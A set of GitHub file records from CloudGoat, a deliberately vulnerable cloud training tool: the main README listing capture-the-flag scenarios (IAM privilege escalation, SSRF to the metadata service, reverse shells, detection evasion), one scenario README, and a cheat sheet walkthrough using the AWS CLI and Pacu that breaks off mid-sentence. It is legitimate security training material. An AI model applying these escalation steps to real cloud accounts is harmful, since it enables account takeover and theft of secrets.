{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/README.md", "content": "# CloudGoat (‚òÅÔ∏èüêê)\n[![Rhino](https://img.shields.io/badge/rhino-vulnerable%20%7C%20tool-red?logo=data:image/png;base64,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)](https://rhinosecuritylabs.com) [![PyPI](https://img.shields.io/badge/python-3.9+-blue.svg)](https://github.com/RhinoSecurityLabs/cloudgoat) [![GitHub license](https://img.shields.io/badge/license-BSD-brightgreen.svg)](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/LICENSE) [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/RhinoSecurityLabs/cloudgoat/pulls)\n\n_CloudGoat is Rhino Security Labs' \"Vulnerable by Design\" cloud deployment tool._\n\n<p align=\"center\">\n  <img src=\"https://rhinosecuritylabs.com/wp-content/uploads/2018/07/cloudgoat-e1533043938802-1140x400.jpg\" width=350/>\n</p>\n\n\n# Quick reference\n- **Where to get help**:\n[the Rhino Security Labs Discord](https://discord.gg/xFXmqytprV), or [Stack Overflow](https://stackoverflow.com/search?tab=newest&q=cloudgoat)\n\n- **Where to file issues**:\n[https://github.com/RhinoSecurityLabs/cloudgoat/issues](https://github.com/RhinoSecurityLabs/cloudgoat/issues)\n\n- **Maintained by**:\n[the CloudGoat Community](https://github.com/RhinoSecurityLabs/cloudgoat)\n\n# CloudGoat 2.0 is here!\n\nCloudGoat is Rhino Security Labs' \"Vulnerable by Design\" cloud deployment tool. It allows you to hone your cloud cybersecurity skills by creating and completing several \"capture-the-flag\" style scenarios. Each scenario is composed of cloud resources arranged together to create a structured learning experience. Some scenarios are easy, some are hard, and many offer multiple paths to victory. As the attacker, it is your mission to explore the environment, identify vulnerabilities, and exploit your way to the scenario's goal(s).\n\nBelow are our main goals for CloudGoat:\n\n* **Focused, Curated, High-Quality Learning Experiences** - Each of CloudGoat‚Äôs scenarios should provide the opportunity for experimentation, exploration, and building hands-on cloud security skills.\n* **Good Documentation** - We've done our best to ensure that CloudGoat‚Äôs scenarios are well-documented and easy to understand and evaluate in terms of difficulty, content, structure, and skills-required.\n* **Easy to Install and Use** - We understand that CloudGoat is a means to an end - learning and practicing cloud security penetration testing. Therefore, we aim to keep things simple, straightforward, and reliable.\n* **Modularity** - Each scenario is a standalone learning environment with a clear goal (or set of goals), and CloudGoat is able to start up, reset, or shut down each scenario independently.\n* **Expandability** - CloudGoat‚Äôs core components (python app and scenarios) are designed to permit easy and independent expansion - by us or the community.\n\nBefore you proceed, please take note of these warnings!\n\n> **Warning #1:** CloudGoat creates intentionally vulnerable resources into your account. DO NOT deploy CloudGoat in a production environment or alongside any sensitive resources.\n\n> **Warning #2:** CloudGoat can only manage resources it creates. If you create any resources yourself in the course of a scenario, you should remove them manually before running the `destroy` command.\n\n## Requirements\n\n* Linux or MacOS. Windows is not officially supported.\n  * Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).\n* Python3.9+ is required.\n* Terraform >= 1.5.0 [installed and in your $PATH](https://learn.hashicorp.com/terraform/getting-started/install.html).\n* The AWS CLI [installed and in your $PATH](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html), and an AWS account with sufficient privileges to create and destroy resources.\n* The AZ CLI [installed and in your $PATH](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli#install), and an Azure account with sufficient privileges to create and destroy resources.\n* [jq](https://stedolan.github.io/jq/)\n\nLinux\n```bash\nsudo apt install terraform awscli azure-cli jq -y\n```\n\nMac\n```bash\nbrew install terraform awscli azure-cli jq\n```\n\n## Quick Start\n\nTo install CloudGoat, make sure your system meets the requirements above, and then run the following commands:\n\n```bash\npipx install cloudgoat\n```\nYou may also want to run some quick configuration commands - it'll save you some time later:\n\nConfigure for AWS - tell CloudGoat which AWS profile to use.\n```bash\ncloudgoat config aws\n```\nConfigure for Azure - tell CloudGoat which Azure subscription to use.\n```bash\ncloudgoat config azure\n```\nLog in to Azure - CloudGoat uses the active `az` account.\n```bash\naz login\n```\n\nConfigure whitelist\n```bash\ncloudgoat config whitelist --auto\n```\nNow, at your command, CloudGoat can `create` an instance of a scenario in the cloud. When the environment is ready, a new folder will be created in the project base directory named after the scenario and with a unique scenario ID appended. Inside this folder will be a file called `start.txt`, which will contain all of the resources you'll need to begin the scenario, though these are also printed to your console when the `create` command completes. Sometimes an SSH keypair named `cloudgoat`/`cloudgoat.pub` will be created as well.\n\n> **Note:** Don't delete or modify the scenario instance folder or the files inside, as this could prevent CloudGoat from being able to manage your scenario's resources.\n\nAs you work through the scenario, feel free to refer to the scenario's readme if you need direction. If you get stuck, there are cheat sheets linked at the bottom of each route's walkthrough.\n\nWhen you are finished with the scenario, delete any resources you created yourself (remember: CloudGoat can only manage resources it creates) and then run the `destroy` command. It's always a good idea to take a quick glance at your web-console afterwards - just in case something didn't get deleted.\n\nYou can read the full documentation for CloudGoat's commands [here in the Usage Guide section](#usage-guide).\n\n## How to use CloudGoat's Docker image\n\n[![Try in PWD](https://github.com/play-with-docker/stacks/raw/cff22438cb4195ace27f9b15784bbb497047afa7/assets/images/button.png)](http://play-with-docker.com?stack=https://raw.githubusercontent.com/RhinoSecurityLabs/cloudgoat/master/docker_stack.yml)\n\n### Option 1: Run with default entrypoint\n```console\ndocker run -it rhinosecuritylabs/cloudgoat:latest\n```\n\n### Option 2: Run with AWS config and credentials\n\n> Warning: Running this command will mount your local AWS configuration files into the Docker container when it is launched. This means that any user with access to the container will have access to your host computer's AWS credentials.\n\n```console\ndocker run -it -v ~/.aws:/root/.aws/ rhinosecuritylabs/cloudgoat:latest\n```\n\n## Scenarios Available\n(Grouped by Difficulty)\n\n<details open>\n  <summary><strong>Easy</strong></summary>\n\n---\n\n### beanstalk_secrets (Easy)\n`cloudgoat create beanstalk_secrets`\n\nIn this scenario, you are provided with low-privileged AWS credentials that grant limited access to Elastic Beanstalk. Your task is to enumerate the Elastic Beanstalk environment and discover misconfigured environment variables containing secondary credentials. Using these secondary credentials, you can enumerate IAM permissions to eventually create an access key for an administrator user. With these admin privileges, you retrieve the final flag stored in AWS Secrets Manager.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/beanstalk_secrets/README.md)  \n\nContributed by Tyler Ramsbey\n\n---\n\n### sns_secrets (Easy)\n`cloudgoat create sns_secrets`\n\nIn this scenario, you start with basic access to an AWS account. You need to enumerate your privileges, discover an SNS Topic you can subscribe to, retrieve a leaked API Key, and finally use the API Key to access an API Gateway for the final flag.  \n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/sns_secrets/README.md)  \n\nContributed by Tyler Ramsbey\n\n---\n\n### iam_privesc_by_key_rotation (Easy)\n`cloudgoat create iam_privesc_by_key_rotation`\n\nExploit insecure IAM permissions to escalate your access. Start with a role that manages other users' credentials and find a weakness in the setup to access the \"admin\" role. Using the admin role, retrieve the flag from Secrets Manager.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md)\n\nContributed by Infrasec.sh \n\n---\n\n### iam_privesc_by_rollback (Easy)\n`cloudgoat create iam_privesc_by_rollback`\n\nStarting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/iam_privesc_by_rollback/README.md)\n\n---\n\n### lambda_privesc (Easy)\n`cloudgoat create lambda_privesc`\n\nStarting as the IAM user Chris, the attacker discovers that they can assume a role that has full Lambda access and pass role permissions. The attacker can then perform privilege escalation using these new permissions to obtain full admin privileges.\n\n> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/lambda_privesc/README.md)\n\n---\n\n### sqs_flag_shop (Easy)\n`cloudgoat create sqs_flag_shop`\n\nFirst, start with the SHOP page where you can buy FLAG. The website has a number of pages, and you can see that the source code is exposed. Attackers analyze the code to find vulnerabilities and use their privileges to purchase FLAG.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/sqs_flag_shop/README.md)\n  \n</details>\n\n<details>\n  <summary><strong>Medium</strong></summary>\n\n### vulnerable_cognito (Medium)\n`cloudgoat create vulnerable_cognito`\n\nIn this scenario, you are presented with a signup and login page with AWS Cognito in the backend. You need to bypass restrictions and exploit misconfigurations in Amazon Cognito in order to elevate your privileges and get Cognito Identity Pool credentials.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/vulnerable_cognito/README.md)\n\nContributed by TrustOnCloud \n\n---\n### vulnerable_lambda (Medium)\n`cloudgoat create vulnerable_lambda`\n\nIn this scenario, you start as the 'bilbo' user. You will assume a role with more privileges, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privileges of the bilbo user in order to search for secrets.  \n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/vulnerable_lambda/README.md)\n\n---\n\n### cloud_breach_s3 (Medium)\n`cloudgoat create cloud_breach_s3`\n\nStarting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/cloud_breach_s3/README.md)\n\n---\n\n### iam_privesc_by_attachment (Medium)\n`cloudgoat create iam_privesc_by_attachment`\n\nStarting with a very limited set of permissions, the attacker is able to leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own. With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario's goal - deleting the cg-super-critical-security-server and paving the way for further nefarious actions.\n\n> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/iam_privesc_by_attachment/README.md)\n\n---\n\n### ec2_ssrf (Medium)\n`cloudgoat create ec2_ssrf`\n\nStarting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/ec2_ssrf/README.md)\n\n---\n\n### ecs_takeover (Medium)\n`cloudgoat create ecs_takeover`\n\nStarting with access to the external website, the attacker needs to find a remote code execution vulnerability. By using RCE the attacker can get access to resources available to the website container. Abusing several ECS misconfigurations the attacker gains access to IAM permissions that allow them to force ECS into rescheduling the target container to a compromised instance.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/ecs_takeover/README.md)\n\n---\n\n### rds_snapshot (Medium)\n`cloudgoat create rds_snapshot`\n\nIn this scenario, we start with the user 'David'. Through David, you can leverage privileges to steal credentials.\nWith the stolen credentials, an attacker can leverage the RDS vulnerability to access the DB and retrieve flags.\n\n> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`. \n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/rds_snapshot/README.md)\n\n---\n\n### glue_privesc (Medium)\n`cloudgoat create glue_privesc`  \n\nThis scenario starts with a web page that uploads a CSV file and performs data visualization through the Glue service.\nThe attacker steals the credentials present on the webpage via a SQL injection attack and uploads a reverse shell to create a Glue Job to obtain the secret string.\n\n> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.  \n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/glue_privesc/README.md)\n  \n</details>\n\n<details>\n  <summary><strong>Hard</strong></summary>\n\n### rce_web_app (Hard)\n`cloudgoat create rce_web_app`\n\nStarting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario‚Äôs goal: a highly-secured RDS database instance.\n\nAlternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/rce_web_app/README.md)\n\n---\n\n### codebuild_secrets (Hard)\n`cloudgoat create codebuild_secrets`\n\nStarting as the IAM user Solo, the attacker first enumerates and explores CodeBuild projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as Calrissian, the attacker discovers an RDS database. Unable to access the database's contents directly, the attacker can make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.\n\nAlternatively, the attacker may explore SSM parameters and find SSH keys to an EC2 instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's keys and push deeper into the target environment, eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.\n\n> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/codebuild_secrets/README.md)\n\n---\n\n### detection_evasion (Hard)\n`cloudgoat create detection_evasion`\n\nThe goal of this scenario is to read out the values for both secrets without being detected. The secrets are both stored in Secrets Manager, and their values have the following format (cg-secret-XXXXXX-XXXXXX).\n\nThis scenario is significantly different from other CloudGoat scenarios. In detection_evasion, your goals will be outlined for you more clearly, and the challenge is to complete them without triggering alarms. There is more setup involved in this scenario, and it will take longer to play (you might want/need to play it multiple times).\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/detection_evasion/README.md)\n\n---\n\n### ecs_efs_attack (Hard)\n`cloudgoat create ecs_efs_attack`\n\nStarting with access to the \"ruse\" EC2, the user leverages the instance profile to backdoor the running ECS container. Using the backdoored container the attacker can retrieve credentials from the container metadata API. These credentials allow the attacker to start a session on any EC2 with the proper tags set. The attacker uses their permissions to change the tags on the Admin EC2 and starts a session. Once in the Admin EC2, the attacker will port scan the subnet for an open EFS to mount. Once mounted, the attacker can retrieve the flag from the elastic file system.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/ecs_efs_attack/README.md)\n\n---\n\n### secrets_in_the_cloud (Hard)\n`cloudgoat create secrets_in_the_cloud`\n\nAs an IAM user with limited privileges, the attacker initiates their journey by examining AWS resources to uncover clues and hidden information. This investigation ultimately results in acquiring a role that grants access to the scenario's primary objective: retrieving the final secret from Secrets Manager.\n\n[Visit Scenario Page.](cloudgoat/scenarios/aws/secrets_in_the_cloud/README.md)\n  \n</details>\n\n\n\n## Usage Guide\n\nThe basic anatomy of a CloudGoat command is as follows:\n\n> `cloudgoat [ command ] [ sub-command ] [ --arg-name ] [ arg-value ]`\n\nThe five main commands in CloudGoat are summarized below:\n\n### create\n\n`create [ scenario-name ]` deploys a scenario to the AWS account of your choosing. You can also run `create` against an existing scenario if you wish - CloudGoat will simply destroy and recreate the scenario named.\n\n> **Tip:** you can use `/scenarios` in the name, which allows for bash's native tab-completion.\n\nNote that the `--profile` is required for safety reasons - we don't want anyone accidentally deploying CloudGoat scenarios to a production environment - and CloudGoat will not use the system's \"default\" AWS CLI profiles or profiles specified as defaults via environment variables. You can, however, set this via `config aws` to avoid having to provide it every time.\n\n### list\n\n`list` shows some information about `all`, `undeployed`, or `deployed` scenarios, or even a lot of information about a `[ scenario-name ]` that's already deployed. You can also filter scenarios by cloud platform: `list aws` or `list azure`.\n\n### destroy\n\n`destroy` shuts down and deletes a `[ scenario-name ]`'s cloud resources, and then moves the scenario instance folder to `./trash` - just in case you need to recover the Terraform state file or other scenario files. You can also specify `all` instead of a scenario name to destroy all active scenarios.\n\n> **Tip:** CloudGoat can only manage resources it creates. If you create any resources yourself in the course of a scenario, you should remove them manually before running the `destroy` command.\n\n### config\n\n`config` allows you to manage various aspects of your CloudGoat installation, specially the IP `whitelist`, your default AWS `profile`, and tab-completion via `argcomplete`. It's worth briefly describing what each of these sub-commands do.\n\n#### whitelist\n\nCloudGoat needs to know what IP addresses should be whitelisted when potentially-vulnerable resources are deployed in the cloud, and these IPs are tracked in a `./whitelist.txt` file in the base project directory. The IP address you provide for whitelisting doesn't _have_ to be in CIDR format, but CloudGoat will add a `/32` to any naked IPs you provide. Optionally, you can add the `--auto` argument, and CloudGoat will automatically make a network request, using curl to ifconfig.co to find your IP address, and then create the whitelist file with the result.\n\n#### aws\n\nWhile CloudGoat will not ever use the system's \"default\" AWS CLI profiles or profiles specified as defaults via environment variables, you can instruct CloudGoat to use a particular AWS profile by name using the `config aws` command. This will prompt for and save your profile's name in a `config.yml` file in the base project directory. As long as that file is present CloudGoat will use the profile name listed inside for create and destroy commands, rather than requiring the `--profile` flag. You can run the `config aws` command at any time to view the name of your CloudGoat-default profile and validate the format of the `config.yml`. You can also create `config.yml` manually, if you wish, provided that you use the correct format.\n\n#### azure\n\nNewer versions of the Azure provider for Terraform require the subscription ID to apply resources to. While CloudGoat uses the same credential configuration as the `az` util, CloudGoat must be told explicitly which subscription to deploy to. The configuration is done with `cloudgoat config azure`, and the subscription is stored in `config.yml` alongside the aws configuration. You can also create `config.yml` manually, if you wish, provided you use the correct format.\n\n#### argcomplete\n\nWe really wanted to have native tab-completion in CloudGoat, but as it turns out that was somewhat difficult to do outside of a REPL. It should work reasonably well for Linux users, and those OSX users brave enough to figure out a way to upgrade their bash version to 4.2+. CloudGoat does include and support [the python library \"argcomplete\"](https://github.com/kislyuk/argcomplete). A brief summary of how to install argcomplete is provided below, though for more detailed steps you should refer to the official documentation at the library's [github page](https://github.com/kislyuk/argcomplete).\n\n1. Install the argcomplete Python package using CloudGoat's requirements.txt file: `$ pip3 install -r core/python/requirements.txt`\n2. In bash, run the global Python argument completion script provided by the argcomplete package: `$ activate-global-python-argcomplete`\n3. Source the completion script at the location printed by the previous activation command, or restart your shell session: `$ source [ /path/to/the/completion/script ]`\n\nFor those who cannot or do not wish to configure argcomplete, CloudGoat also supports the use of directory paths as scenario names, which means tab-completion will work for scenario names. Just use `/scenario/[ scenario-name ]` or `./[ scenarioinstance-name ]` and your shell should do the rest.\n\n### help\n\n`help` provides contextual help about commands. `help` can come before or after the command in question, so it's always there when you need it. Below are some examples:\n\n* `cloudgoat create help`\n* `cloudgoat destroy help`\n* `cloudgoat list help`\n* `cloudgoat config help`\n\nOne other use of note: `cloudgoat [ scenario-name ] help` can be used to print to the console a brief summary of the scenario, as defined by the scenario's author.\n\n## Feature Requests and Bug Reports\n\nIf you have a feature request or a bug to report, please [submit them here](https://github.com/RhinoSecurityLabs/cloudgoat/issues/new).\n\nFor bugs, please make sure to include a description sufficient to reproduce the bug you found, including tracebacks and reproduction steps, and check for other reports of your bug before filing a new bug report.\n\nFor features, much the same applies! Be specific in your request, and make sure someone else hasn't already requested the same feature.\n\n## Contribution Guidelines\n\nContributions to CloudGoat are greatly appreciated. If you'd like to help make the project better, read on.\n\n1. **Creating a New Scenario**:\n   - We have provided a scenario template to help you get started quickly. The template includes the basic structure and necessary files for a CloudGoat scenario. You can find the scenario template [here](/scenarios/scenario_template).\n   - **Steps to Create a New Scenario**:\n     - **Copy the Template**: Copy the contents of the scenario template to a new directory named after your scenario.\n     - **Modify the Template**: Replace the placeholder content in the template with the specifics of your new scenario.\n     - **Test the Scenario**: Ensure that your scenario works as expected by testing it thoroughly.\n2. **Coding Standards**:\n   - **Code Style**: Follow the existing code style in the project. Consistency is key.\n   - **Comments**: Add comments to your code where necessary to explain complex logic or important decisions.\n   - **Documentation**: Update the README.md and other relevant documentation to include details about your new scenario or changes.\n3. **Whitelisting**:\n   - When creating or modifying scenarios, keep the following in mind:\n     - **Whitelisting**: Ensure that security group rules and other access controls are configured to whitelist only the IP from the CloudGoat configuration.\n     - **Review**: Double-check your configurations for any potentially vulnerable public resources before contributing (i.e. do not create vulnerable EC2s accessible to the internet). \n4. **Python Code Style**:\n   - Python code in CloudGoat should generally follow Python's style conventions, favoring readability and maintainability above all.\n   - Follow good git practices: use pull requests, prefer feature branches, always write clear commit messages.\n   - CloudGoat uses `black` and `flake8` - Python syntax and style linters. Ensure that both `flake8` and `black` are run on all Python files in `core/python/` and on `cloudgoat.py` before committing code. `black`'s decisions take priority over `flake8`'s. Both of these are commented out in the `core/python/requirements.txt` file since normal users don't need them.\n5. **Licensing**:\n   - CloudGoat code should always use the BSD 3-clause license.\n\nAnd lastly, thank you for contributing!\n\n\n## Changelog\n\n- **6/24/19:** CloudGoat 2.0 is released!\n\n## Disclaimer\n\nCloudGoat is software that comes with absolutely no warranties whatsoever. By using CloudGoat, you take full responsibility for any and all outcomes that result.\n", "timestamp": "2025-10-24T11:39:32.878035"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/beanstalk_secrets/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/beanstalk_secrets/README.md", "content": "# Scenario: beanstalk_secrets\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `./cloudgoat.py create beanstalk_secrets`\n\n## Scenario Resources\n\n- 1 VPC\n- 1 Elastic Beanstalk Environment\n- 1 IAM Low-Privilege User\n- 1 IAM Secondary User\n- 1 AWS Secrets Manager Secret\n\n## Scenario Start(s)\n\n1. AWS Access Key and Secret Key for the low-privileged user.\n\n## Scenario Goal(s)\n\nRetrieve the final flag from AWS Secrets Manager by escalating privileges from a low-privileged user to an administrator account.\n\n## Summary\n\nIn this scenario, you are provided with low-privileged AWS credentials that grant limited access to Elastic Beanstalk. Your task is to enumerate the Elastic Beanstalk environment and discover misconfigured environment variables containing secondary credentials. Using these secondary credentials, you can enumerate IAM permissions to eventually create an access key for an administrator user. With these admin privileges, you retrieve the final flag stored in AWS Secrets Manager.\n\n## Exploitation Route\n\n\n![Flowcharts](https://github.com/user-attachments/assets/cf16f767-d8b3-436f-9812-c2d06ea0876b)\n\n\n\n## Walkthrough - Elastic Beanstalk Secrets\n\n1. Start by using the provided low-privileged AWS credentials.\n2. Verify access with `aws sts get-caller-identity`.\n3. Enumerate Elastic Beanstalk applications and environments using Pacu‚Äôs `elasticbeanstalk__enum` module.\n4. Identify the EB environment with misconfigured environment variables that store secondary credentials.\n5. Use the secondary credentials to enumerate IAM resources and permissions.\n6. Discover that you can create an access key for an administrator user using the `iam:CreateAccessKey` permission.\n7. Generate an admin access key and take over the account.\n8. Finally, use the admin privileges to retrieve the final flag from AWS Secrets Manager.\n\nA detailed cheat sheet & walkthrough for this route is available [here](./cheat_sheet.md).\n", "timestamp": "2025-10-24T11:39:34.867949"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/beanstalk_secrets/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/beanstalk_secrets/cheat_sheet.md", "content": "# Beanstalk Secrets Walkthrough\n\n## Summary\n\nIn this scenario, you are provided with low-privileged AWS credentials. Your task is to enumerate Elastic Beanstalk applications and environments, discover misconfigured environment variables that leak secondary credentials, and then use these credentials to enumerate IAM permissions. By exploiting the ability to create an access key for an administrator user, you will escalate your privileges and ultimately retrieve the final flag stored in AWS Secrets Manager.\n\n## Detailed Walkthrough\n\n### Configuring the AWS Keys\n\nAfter launching the scenario, you will be provided with an AWS Access Key ID and Secret Access Key for the low-privileged user. Configure your AWS CLI profile with these credentials:\n\n```bash\naws configure --profile beanstalk\n```\n\nYou will be prompted for the Access Key, Secret Key, Region, and output format. For example:\n\n```bash\nAWS Access Key ID: AKIA2HV********\nAWS Secret Access Key: v+xInRa11dSj**************\nDefault region name: us-east-1\nDefault output format: json\n```\n\nVerify your access:\n\n```bash\naws sts get-caller-identity --profile beanstalk\n```\n\n### Enumerating Elastic Beanstalk\n\nUse Pacu to enumerate Elastic Beanstalk applications and environments:\n\n```bash\nPacu (beanstalk:imported-beanstalk) > run elasticbeanstalk__enum --region us-east-1\n```\n\nThe module will list available applications and environments. Notice the misconfigured environment where environment variables reveal secondary credentials.\n\n### Checking Permissions with Pacu\n\nNext, assess the permissions of the low-privileged user by enumerating available IAM actions:\n\n```bash\nPacu (beanstalk:imported-beanstalk) > run iam__bruteforce_permissions --region us-east-1\n```\n\nReview the output to understand the limited permissions available on Elastic Beanstalk and IAM.\n\n### Switching to the Secondary User\n\nThe Elastic Beanstalk environment stores secondary credentials in its environment variables. Use these credentials to configure a new AWS CLI profile:\n\n```bash\naws configure --profile beanstalk2\n```\n\nVerify the secondary user‚Äôs access:\n\n```bash\naws sts get-caller-identity --profile beanstalk2\n```\n\n### Enumerating IAM with the Secondary User\n\nWith the secondary credentials, enumerate IAM permissions:\n\n```bash\nPacu (beanstalk2:imported-beanstalk2) > run iam__enum_permissions\n```\n\nThis will display additional IAM permissions, including the ability to create an access key for other 